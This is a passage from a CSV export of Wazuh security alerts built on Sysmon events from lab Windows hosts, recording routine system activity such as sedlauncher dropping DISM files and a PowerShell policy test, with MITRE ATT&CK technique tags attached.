User: NT AUTHORITY\NETWORK SERVICE""",3,2024-11-30T07:29:27.170616100Z,55274,1756,DESKTOP-QGB4EQH,7,2356,INFORMATION,Microsoft-Windows-Sysmon,1,false,4,Process loaded taskschd.dll module. May be used to create delayed malware execution,"[""sysmon"",""sysmon_eid7_detections"",""windows""]",92154, , ,windows_eventchannel,log,"Nov 30, 2024 @ 07:29:28.029",EventChannel,1732951768.1417010,"Nov 30, 2024 @ 07:29:28.029", , , , , , , , , , , , ,3356, , , , , , , , , , ,"[""Scheduled Task""]","[""T1053.005""]","[""Execution"",""Persistence"",""Privilege Escalation""]", , , ,taskschd.dll,C:\\Windows\\System32\\wbem\\WmiPrvSE.exe,Microsoft® Windows® Operating System,Microsoft Windows,C:\\Windows\\System32\\taskschd.dll,Task Scheduler COM API,true,Valid,{15959494-D38A-6749-4100-000000000D00},2024-11-30 07:29:27.154,"SHA1=47221E645D323256A4B0B12B09891E30789EFECC,MD5=46EBDA1D65D32F2D329B8051D039F801,SHA256=52E960EDCCAEF5BB2BCD16627F3FB51BF43D1E97B4BD29D86A72172D0BF1022E,IMPHASH=88AA0B6E4721D06B33225AE5D36F7D6F","technique_id=T1053,technique_name=Scheduled Task",Microsoft Corporation,10.0.17134.1 (WinBuild.160101.0800),NT AUTHORITY\\NETWORK SERVICE, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.11.30,efr4e5MBRlc-D5DFTR5y,1,1,192.168.117.134,window-agent3,003,Maryam, ,11, ,0x8000000000000000,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},4,Microsoft-Windows-Sysmon/Operational,0,"""File created:
RuleName: technique_id=T1059.001,technique_name=PowerShell
UtcTime: 2024-11-30 07:28:05.827
ProcessGuid: {15959494-BE85-674A-6506-000000000D00}
ProcessId: 6592
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\mari\AppData\Local\Temp\__PSScriptPolicyTest_jngntb5l.w2x.ps1
CreationUtcTime: 2024-11-30 07:28:05.827
User: DESKTOP-QGB4EQH\mari""",2,2024-11-30T07:28:05.834223400Z,55252,1760,DESKTOP-QGB4EQH,11,2356,INFORMATION,Microsoft-Windows-Sysmon,59,true,15,Executable file dropped in folder commonly used by malware,"[""sysmon"",""sysmon_eid11_detections"",""windows""]",92213, , ,windows_eventchannel,log,"Nov 30, 2024 @ 07:28:06.939",EventChannel,1732951686.1404487,"Nov 30, 2024 @ 07:28:06.939", , , , , , , , , , , , ,6592, , , , , , , , , , ,"[""Ingress Tool Transfer""]","[""T1105""]","[""Command and Control""]", , , , ,C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe, , , , , , ,{15959494-BE85-674A-6506-000000000D00},2024-11-30 07:28:05.827, ,"technique_id=T1059.001,technique_name=PowerShell", , ,DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , ,C:\\Users\\mari\\AppData\\Local\\Temp\\__PSScriptPolicyTest_jngntb5l.w2x.ps1,2024-11-30 07:28:05.827, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.11.30,avr0e5MBRlc-D5DFdR4B,1,1,192.168.117.134,window-agent3,003,Maryam, ,1014, ,0x4000000010000000,{1C95126E-7EEA-49A9-A3FE-A378B03DDB4D},3,System,0,"""Name resolution for the name wpad timed out after none of the configured DNS servers responded.""",0,2024-11-30T07:23:52.438317100Z,2060,7704,DESKTOP-QGB4EQH,1014,1384,WARNING,Microsoft-Windows-DNS-Client,4,false,5,Name resolution for the name wpad timed out,"[""windows"",""windows_system""]",61109, , ,windows_eventchannel,log,"Nov 30, 2024 @ 07:23:53.500",EventChannel,1732951433.1326257,"Nov 30, 2024 @ 07:23:53.500", , , , , , , , , , , , , , , , , , , , , , , , , , ,128,02000000C0A87502000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000,wpad, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.11.30,4voNfJMBRlc-D5DFKR6w,1,1,192.168.117.130,wazuh-agent,002,Maryam, ,1, ,0x8000000000000000,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},4,Microsoft-Windows-Sysmon/Operational,0,"""Process Create:
RuleName: -
UtcTime: 2024-11-30 07:50:52.979
ProcessGuid: {D8AF36FB-C3DC-674A-C400-000000000900}
ProcessId: 2132
Image: C:\Windows\System32\cmd.exe
FileVersion: 10.0.17134.1 (WinBuild.160101.0800)
Description: Windows Command Processor
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: Cmd.Exe
CommandLine: C:\Windows\system32\cmd.exe /c  C:\Windows\system32\usoclient.exe StartScan
CurrentDirectory: C:\Windows\system32\
User: NT AUTHORITY\SYSTEM
LogonGuid: {D8AF36FB-C38E-674A-E703-000000000000}
LogonId: 0x3E7
TerminalSessionId: 0
IntegrityLevel: System
Hashes: MD5=4E2ACF4F8A396486AB4268C94A6A245F,SHA256=9A7C58BD98D70631AA1473F7B57B426DB367D72429A5455B433A05EE251F3236,IMPHASH=8542FB14699D84D7E8DA92F66145C7FE
ParentProcessGuid: {D8AF36FB-C391-674A-2700-000000000900}
ParentProcessId: 2100
ParentImage: C:\Program Files\rempl\sedlauncher.exe
ParentCommandLine: ""C:\Program Files\rempl\sedlauncher.exe""
ParentUser: NT AUTHORITY\SYSTEM""",5,2024-11-30T07:50:52.987513800Z,50313,4148,DESKTOP-FMI6MML,1,2364,INFORMATION,Microsoft-Windows-Sysmon,12,false,4,Windows command prompt started by an abnormal process,"[""sysmon"",""sysmon_eid1_detections"",""windows""]",92052, , ,windows_eventchannel,log,"Nov 30, 2024 @ 07:50:54.608",EventChannel,1732953054.1845156,"Nov 30, 2024 @ 07:50:54.608", , , , , , , ,{D8AF36FB-C38E-674A-E703-000000000000}, , , , ,2132, , , , , , , , , , ,"[""Windows Command Shell""]","[""T1059.003""]","[""Execution""]", , , ,Cmd.Exe,C:\\Windows\\System32\\cmd.exe,Microsoft® Windows® Operating System, , ,Windows Command Processor, , ,{D8AF36FB-C3DC-674A-C400-000000000900},2024-11-30 07:50:52.979,"MD5=4E2ACF4F8A396486AB4268C94A6A245F,SHA256=9A7C58BD98D70631AA1473F7B57B426DB367D72429A5455B433A05EE251F3236,IMPHASH=8542FB14699D84D7E8DA92F66145C7FE", ,Microsoft Corporation,10.0.17134.1 (WinBuild.160101.0800),NT AUTHORITY\\SYSTEM, , , , , , , , , , , , , , , , , , , , , , , , , , ,{D8AF36FB-C391-674A-2700-000000000900},"\""C:\\Program Files\\rempl\\sedlauncher.exe\""",0x3e7,2100,C:\\Windows\\system32\\,C:\\Program Files\\rempl\\sedlauncher.exe,C:\\Windows\\system32\\cmd.exe /c  C:\\Windows\\system32\\usoclient.exe StartScan,System,0,NT AUTHORITY\\SYSTEM, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.11.30,5foNfJMBRlc-D5DFKR6w,1,1,192.168.117.130,wazuh-agent,002,Maryam, ,11, ,0x8000000000000000,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},4,Microsoft-Windows-Sysmon/Operational,0,"""File created:
RuleName: DLL
UtcTime: 2024-11-30 07:50:54.155
ProcessGuid: {D8AF36FB-C391-674A-2700-000000000900}
ProcessId: 2100
Image: C:\Program Files\rempl\sedlauncher.exe
TargetFilename: C:\Windows\Temp\E5CF567C-6C5E-4184-AF5C-9F04B023A8F0\AssocProvider.dll
CreationUtcTime: 2024-11-30 07:50:54.155
User: NT AUTHORITY\SYSTEM""",2,2024-11-30T07:50:54.164359900Z,50319,4148,DESKTOP-FMI6MML,11,2364,INFORMATION,Microsoft-Windows-Sysmon,2,false,6,Executable dropped in Windows root folder,"[""sysmon"",""sysmon_eid11_detections"",""windows""]",92217, , ,windows_eventchannel,log,"Nov 30, 2024 @ 07:50:55.563",EventChannel,1732953055.1862253,"Nov 30, 2024 @ 07:50:55.563", , , , , , , , , , , , ,2100, , , , , , , , , , ,"[""Lateral Tool Transfer""]","[""T1570""]","[""Lateral Movement""]", , , , ,C:\\Program Files\\rempl\\sedlauncher.exe, , , , , , ,{D8AF36FB-C391-674A-2700-000000000900},2024-11-30 07:50:54.155, ,DLL, , ,NT AUTHORITY\\SYSTEM, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , ,C:\\Windows\\Temp\\E5CF567C-6C5E-4184-AF5C-9F04B023A8F0\\AssocProvider.dll,2024-11-30 07:50:54.155, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.11.30,6PoNfJMBRlc-D5DFKR6w,1,1,192.168.117.130,wazuh-agent,002,Maryam, ,11, ,0x8000000000000000,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},4,Microsoft-Windows-Sysmon/Operational,0,"""File created:
RuleName: DLL
UtcTime: 2024-11-30 07:50:54.155
ProcessGuid: {D8AF36FB-C391-674A-2700-000000000900}
ProcessId: 2100
Image: C:\Program Files\rempl\sedlauncher.exe
TargetFilename: C:\Windows\Temp\E5CF567C-6C5E-4184-AF5C-9F04B023A8F0\CbsProvider.dll
CreationUtcTime: 2024-11-30 07:50:54.155
User: NT AUTHORITY\SYSTEM""",2,2024-11-30T07:50:54.167315200Z,50320,4148,DESKTOP-FMI6MML,11,2364,INFORMATION,Microsoft-Windows-Sysmon,4,false,6,Executable dropped in Windows root folder,"[""sysmon"",""sysmon_eid11_detections"",""windows""]",92217, , ,windows_eventchannel,log,"Nov 30, 2024 @ 07:50:55.592",EventChannel,1732953055.1870368,"Nov 30, 2024 @ 07:50:55.592", , , , , , , , , , , , ,2100, , , , , , , , , , ,"[""Lateral Tool Transfer""]","[""T1570""]","[""Lateral Movement""]", , , , ,C:\\Program Files\\rempl\\sedlauncher.exe, , , , , , ,{D8AF36FB-C391-674A-2700-000000000900},2024-11-30 07:50:54.155, ,DLL, , ,NT AUTHORITY\\SYSTEM, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , ,C:\\Windows\\Temp\\E5CF567C-6C5E-4184-AF5C-9F04B023A8F0\\CbsProvider.dll,2024-11-30 07:50:54.155, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.11.30,6voNfJMBRlc-D5DFKR6w,1,1,192.168.117.130,wazuh-agent,002,Maryam, ,11, ,0x8000000000000000,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},4,Microsoft-Windows-Sysmon/Operational,0,"""File created:
RuleName: DLL
UtcTime: 2024-11-30 07:50:54.171
ProcessGuid: {D8AF36FB-C391-674A-2700-000000000900}
ProcessId: 2100
Image: C:\Program Files\rempl\sedlauncher.exe
TargetFilename: C:\Windows\Temp\E5CF567C-6C5E-4184-AF5C-9F04B023A8F0\DismCorePS.dll
CreationUtcTime: 2024-11-30 07:50:54.171
User: NT AUTHORITY\SYSTEM""",2,2024-11-30T07:50:54.178953600Z,50323,4148,DESKTOP-FMI6MML,11,2364,INFORMATION,Microsoft-Windows-Sysmon,7,false,6,Executable dropped in Windows root folder,"[""sysmon"",""sysmon_eid11_detections"",""windows""]",92217, , ,windows_eventchannel,log,"Nov 30, 2024 @ 07:50:55.624",EventChannel,1732953055.1875750,"Nov 30, 2024 @ 07:50:55.624", , , , , , , , , , , , ,2100, , , , , , , , , , ,"[""Lateral Tool Transfer""]","[""T1570""]","[""Lateral Movement""]", , , , ,C:\\Program Files\\rempl\\sedlauncher.exe, , , , , , ,{D8AF36FB-C391-674A-2700-000000000900},2024-11-30 07:50:54.171, ,DLL, , ,NT AUTHORITY\\SYSTEM, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , ,C:\\Windows\\Temp\\E5CF567C-6C5E-4184-AF5C-9F04B023A8F0\\DismCorePS.dll,2024-11-30 07:50:54.171, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.11.30,7PoNfJMBRlc-D5DFKR6w,1,1,192.168.117.130,wazuh-agent,002,Maryam, ,11, ,0x8000000000000000,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},4,Microsoft-Windows-Sysmon/Operational,0,"""File created:
RuleName: EXE
UtcTime: 2024-11-30 07:50:54.171
ProcessGuid: {D8AF36FB-C391-674A-2700-000000000900}
ProcessId: 2100
Image: C:\Program Files\rempl\sedlauncher.exe
TargetFilename: C:\Windows\Temp\E5CF567C-6C5E-4184-AF5C-9F04B023A8F0\DismHost.exe
CreationUtcTime: 2024-11-30 07:50:54.171
User: NT AUTHORITY\SYSTEM""",2,2024-11-30T07:50:54.181869000Z,50324,4148,DESKTOP-FMI6MML,11,2364,INFORMATION,Microsoft-Windows-Sysmon,8,false,6,Executable dropped in Windows root folder,"[""sysmon"",""sysmon_eid11_detections"",""windows""]",92217, , ,windows_eventchannel,log,"Nov 30, 2024 @ 07:50:55.654",EventChannel,1732953055.1881128,"Nov 30, 2024 @ 07:50:55.654", , , , , , , , , , , , ,2100, , , , , , , , , , ,"[""Lateral Tool Transfer""]","[""T1570""]","[""Lateral Movement""]", , , , ,C:\\Program Files\\rempl\\sedlauncher.exe, , , , , , ,{D8AF36FB-C391-674A-2700-000000000900},2024-11-30 07:50:54.171, ,EXE, , ,NT AUTHORITY\\SYSTEM, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , ,C:\\Windows\\Temp\\E5CF567C-6C5E-4184-AF5C-9F04B023A8F0\\DismHost.exe,2024-11-30 07:50:54.171, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.11.30,8foNfJMBRlc-D5DFKR6w,1,1,192.168.117.130,wazuh-agent,002,Maryam, ,11, ,0x8000000000000000,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},4,Microsoft-Windows-Sysmon/Operational,0,"""File created:
RuleName: DLL
UtcTime: 2024-11-30 07:50:54.358
ProcessGuid: {D8AF36FB-C391-674A-2700-000000000900}
ProcessId: 2100
Image: C:\Program Files\rempl\sedlauncher.exe
TargetFilename: C:\Windows\Temp\E5CF567C-6C5E-4184-AF5C-9F04B023A8F0\ImagingProvider.dll
CreationUtcTime: 2024-11-30 07:50:54.358
User: NT AUTHORITY\SYSTEM""",2,2024-11-30T07:50:54.364124400Z,50331,4148,DESKTOP-FMI6MML,11,2364,INFORMATION,Microsoft-Windows-Sysmon,14,false,6,Executable dropped in Windows root folder,"[""sysmon"",""sysmon_eid11_detections"",""windows""]",92217, , ,windows_eventchannel,log,"Nov 30, 2024 @ 07:50:55.749",EventChannel,1732953055.1894629,"Nov 30, 2024 @ 07:50:55.749", , , , , , , , , , , , ,2100, , , , , , , , , , ,"[""Lateral Tool Transfer""]","[""T1570""]","[""Lateral Movement""]", , , , ,C:\\Program Files\\rempl\\sedlauncher.exe, , , , , , ,{D8AF36FB-C391-674A-2700-000000000900},2024-11-30 07:50:54.358, ,DLL, , ,NT AUTHORITY\\SYSTEM, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , ,C:\\Windows\\Temp\\E5CF567C-6C5E-4184-AF5C-9F04B023A8F0\\ImagingProvider.dll,2024-11-30 07:50:54.358, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.11.30,8voNfJMBRlc-D5DFKR6w,1,1,192.168.117.130,wazuh-agent,002,Maryam, ,11, ,0x8000000000000000,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},4,Microsoft-Windows-Sysmon/Operational,0,"""File created:
RuleName: DLL
UtcTime: 2024-11-30 07:50:54.358
ProcessGuid: {D8AF36FB-C391-674A-2700-000000000900}
ProcessId: 2100
Image: C:\Program Files\rempl\sedlauncher.exe
TargetFilename: C:\Windows\Temp\E5CF567C-6C5E-4184-AF5C-9F04B023A8F0\IBSProvider.dll
CreationUtcTime: 2024-11-30 07:50:54.358
User: NT AUTHORITY\SYSTEM""",2,2024-11-30T07:50:54.360983800Z,50330,4148,DESKTOP-FMI6MML,11,2364,INFORMATION,Microsoft-Windows-Sysmon,15,false,6,Executable dropped in Windows root folder,"[""sysmon"",""sysmon_eid11_detections"",""windows""]",92217, , ,windows_eventchannel,log,"Nov 30, 2024 @ 07:50:55.749",EventChannel,1732953055.1897342,"Nov 30, 2024 @ 07:50:55.749", , , , , , , , , , , , ,2100, , , , , , , , , , ,"[""Lateral Tool Transfer""]","[""T1570""]","[""Lateral Movement""]", , , , ,C:\\Program Files\\rempl\\sedlauncher.exe, , , , , , ,{D8AF36FB-C391-674A-2700-000000000900},2024-11-30 07:50:54.358, ,DLL, , ,NT AUTHORITY\\SYSTEM, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , ,C:\\Windows\\Temp\\E5CF567C-6C5E-4184-AF5C-9F04B023A8F0\\IBSProvider.dll,2024-11-30 07:50:54.358, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.11.30,8_oNfJMBRlc-D5DFKR6w,1,1,192.168.117.130,wazuh-agent,002,Maryam, ,11, ,0x8000000000000000,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},4,Microsoft-Windows-Sysmon/Operational,0,"""File created:
RuleName: DLL
UtcTime: 2024-11-30 07:50:54.358
ProcessGuid: {D8AF36FB-C391-674A-2700-000000000900}
ProcessId: 2100
Image: C:\Program Files\rempl\sedlauncher.exe
TargetFilename: C:\Windows\Temp\E5CF567C-6C5E-4184-AF5C-9F04B023A8F0\LogProvider.dll
CreationUtcTime: 2024-11-30 07:50:54.358
User: NT AUTHORITY\SYSTEM""",2,2024-11-30T07:50:54.371492800Z,50333,4148,DESKTOP-FMI6MML,11,2364,INFORMATION,Microsoft-Windows-Sysmon,17,false,6,Executable dropped in Windows root folder,"[""sysmon"",""sysmon_eid11_detections"",""windows""]",92217, , ,windows_eventchannel,log,"Nov 30, 2024 @ 07:50:55.781",EventChannel,1732953055.1900039,"Nov 30, 2024 @ 07:50:55.781", , , , , , , , , , , , ,2100, , , , , , , , , , ,"[""Lateral Tool Transfer""]","[""T1570""]","[""Lateral Movement""]", , , , ,C:\\Program Files\\rempl\\sedlauncher.exe, , , , , , ,{D8AF36FB-C391-674A-2700-000000000900},2024-11-30 07:50:54.358, ,DLL, , ,NT AUTHORITY\\SYSTEM, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , ,C:\\Windows\\Temp\\E5CF567C-6C5E-4184-AF5C-9F04B023A8F0\\LogProvider.dll,2024-11-30 07:50:54.358, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.11.30,9voNfJMBRlc-D5DFKR6w,1,1,192.168.117.130,wazuh-agent,002,Maryam, ,11, ,0x8000000000000000,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},4,Microsoft-Windows-Sysmon/Operational,0,"""File created:
RuleName: DLL
UtcTime: 2024-11-30 07:50:54.405
ProcessGuid: {D8AF36FB-C391-674A-2700-000000000900}
ProcessId: 2100
Image: C:\Program Files\rempl\sedlauncher.exe
TargetFilename: C:\Windows\Temp\E5CF567C-6C5E-4184-AF5C-9F04B023A8F0\OfflineSetupProvider.dll
CreationUtcTime: 2024-11-30 07:50:54.405
User: NT AUTHORITY\SYSTEM""",2,2024-11-30T07:50:54.407310400Z,50335,4148,DESKTOP-FMI6MML,11,2364,INFORMATION,Microsoft-Windows-Sysmon,18,false,6,Executable dropped in Windows root folder,"[""sysmon"",""sysmon_eid11_detections"",""windows""]",92217, , ,windows_eventchannel,log,"Nov 30, 2024 @ 07:50:55.811",EventChannel,1732953055.1908134,"Nov 30, 2024 @ 07:50:55.811", , , , , , , , , , , , ,2100, , , , , , , , , , ,"[""Lateral Tool Transfer""]","[""T1570""]","[""Lateral Movement""]", , , , ,C:\\Program Files\\rempl\\sedlauncher.exe, , , , , , ,{D8AF36FB-C391-674A-2700-000000000900},2024-11-30 07:50:54.405, ,DLL, , ,NT AUTHORITY\\SYSTEM, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , ,C:\\Windows\\Temp\\E5CF567C-6C5E-4184-AF5C-9F04B023A8F0\\OfflineSetupProvider.dll,2024-11-30 07:50:54.405, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.11.30,APoNfJMBRlc-D5DFKR-w,1,1,192.168.117.130,wazuh-agent,002,Maryam, ,1, ,0x8000000000000000,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},4,Microsoft-Windows-Sysmon/Operational,0,"""Process Create:
RuleName: -
UtcTime: 2024-11-30 07:50:54.921
ProcessGuid: {D8AF36FB-C3DE-674A-D000-000000000900}
ProcessId: 540
Image: C:\Windows\System32\cmd.exe
FileVersion: 10.0.17134.1 (WinBuild.160101.0800)
Description: Windows Command Processor
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: Cmd.Exe
CommandLine: C:\Windows\system32\cmd.exe /c C:\Windows\system32\powercfg.exe /getactivescheme > C:\Windows\TEMP\PowerPlan.log
CurrentDirectory: C:\Windows\system32\
User: NT AUTHORITY\SYSTEM
LogonGuid: {D8AF36FB-C38E-674A-E703-000000000000}
LogonId: 0x3E7
TerminalSessionId: 0
IntegrityLevel: System
Hashes: MD5=4E2ACF4F8A396486AB4268C94A6A245F,SHA256=9A7C58BD98D70631AA1473F7B57B426DB367D72429A5455B433A05EE251F3236,IMPHASH=8542FB14699D84D7E8DA92F66145C7FE
ParentProcessGuid: {D8AF36FB-C391-674A-2700-000000000900}
ParentProcessId: 2100
ParentImage: C:\Program Files\rempl\sedlauncher.exe
ParentCommandLine: ""C:\Program Files\rempl\sedlauncher.exe""
ParentUser: NT AUTHORITY\SYSTEM""",5,2024-11-30T07:50:54.926534200Z,50349,4148,DESKTOP-FMI6MML,1,2364,INFORMATION,Microsoft-Windows-Sysmon,14,false,4,Windows command prompt started by an abnormal process,"[""sysmon"",""sysmon_eid1_detections"",""windows""]",92052, , ,windows_eventchannel,log,"Nov 30, 2024 @ 07:50:56.030",EventChannel,1732953056.1935236,"Nov 30, 2024 @ 07:50:56.030", , , , , , , ,{D8AF36FB-C38E-674A-E703-000000000000}, , , , ,540, , , , , , , , , , ,"[""Windows Command Shell""]","[""T1059.003""]","[""Execution""]", , , ,Cmd.Exe,C:\\Windows\\System32\\cmd.exe,Microsoft® Windows® Operating System, , ,Windows Command Processor, , ,{D8AF36FB-C3DE-674A-D000-000000000900},2024-11-30 07:50:54.921,"MD5=4E2ACF4F8A396486AB4268C94A6A245F,SHA256=9A7C58BD98D70631AA1473F7B57B426DB367D72429A5455B433A05EE251F3236,IMPHASH=8542FB14699D84D7E8DA92F66145C7FE", ,Microsoft Corporation,10.0.17134.1 (WinBuild.160101.0800),NT AUTHORITY\\SYSTEM, , , , , , , , , , , , , , , , , , , , , , , , , , ,{D8AF36FB-C391-674A-2700-000000000900},"\""C:\\Program Files\\rempl\\sedlauncher.exe\""",0x3e7,2100,C:\\Windows\\system32\\,C:\\Program Files\\rempl\\sedlauncher.exe,C:\\Windows\\system32\\cmd.exe /c C:\\Windows\\system32\\powercfg.exe /getactivescheme &gt; C:\\Windows\\TEMP\\PowerPlan.log,System,0,NT AUTHORITY\\SYSTEM, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
